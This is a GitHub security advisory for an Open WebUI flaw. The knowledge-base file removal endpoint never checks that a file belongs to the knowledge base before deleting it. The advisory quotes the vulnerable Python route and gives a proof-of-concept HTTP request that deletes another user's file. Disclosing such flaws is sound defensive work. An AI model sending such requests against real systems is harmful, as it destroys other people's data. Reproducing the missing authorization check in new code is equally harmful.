# [M] Open WebUI has unauthorized deletion of knowledge files

## Summary
Severity: Medium
Advisory: GHSA-26gm-93rw-cchf
CVE: CVE-2026-29070
CWE: CWE-862
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-26gm-93rw-cchf
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.8.6

## Details
### Summary
An access control check is missing when deleting a file from a knowledge base. The only check being done is that the user has write access to the knowledge base (or is admin), but NOT that the file actually belongs to this knowledge base. It is thus possible to delete arbitrary files from arbitrary knowledge bases (as long as one knows the file id)

### Details
The source code at https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/knowledge.py#L803 does not properly validate that the file being deleted belongs to the current knowledge base:
```
@router.post("/{id}/file/remove", response_model=Optional[KnowledgeFilesResponse])
def remove_file_from_knowledge_by_id(
    id: str,
    form_data: KnowledgeFileIdForm,
    delete_file: bool = Query(True),
    user=Depends(get_verified_user),
    db: Session = Depends(get_session),
):
    knowledge = Knowledges.get_knowledge_by_id(id=id, db=db)
    [...]
    # Note  : Access control check on the knowledge base
    if (
        knowledge.user_id != user.id
        and not AccessGrants.has_access(
            user_id=user.id,
            resource_type="knowledge",
            resource_id=knowledge.id,
            permission="write",
            db=db,
        )
        and user.role != "admin"
    ):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=ERROR_MESSAGES.ACCESS_PROHIBITED,
        )

    file = Files.get_file_by_id(form_data.file_id, db=db)
    [...]
    # Note : No checks on the file

    if delete_file:
        try:
            # Remove the file's collection from vector database
            file_collection = f"file-{form_data.file_id}"
            if VECTOR_DB_CLIENT.has_collection(collection_name=file_collection):
                VECTOR_DB_CLIENT.delete_collection(collection_name=file_collection)
        except Exception as e:
            log.debug("This was most likely caused by bypassing embedding processing")
            log.debug(e)
            pass

        # Delete file from database
        Files.delete_file_by_id(form_data.file_id, db=db)
[...]
```

### PoC
Victim has a knowledge base with a file (id: 9db6dcee-bb3b-483e-aaf3-310fda366af1)
Attacker creates their own collection (id: dde9e2b6-21c9-4aa1-a1cf-8cb0e4392f2b)
Attacker deletes the victim file from their own collection:
```
POST /api/v1/knowledge/dde9e2b6-21c9-4aa1-a1cf-8cb0e4392f2b/file/remove HTTP/1.1
Host: gaius-neo-val.fr.space.corp
Authorization: Bearer eyJhbGciOiJIUzI1[...]nHiaod-3vfNE0
[...]

{"file_id":"9db6dcee-bb3b-483e-aaf3-310fda366af1"}

-----

HTTP/1.1 200 OK
[...]
```
The file is then deleted from the victim's knowledge base.


### Impact
Arbitrary file deletion

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-26gm-93rw-cchf
- https://nvd.nist.gov/vuln/detail/CVE-2026-29070
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/knowledge.py#L803
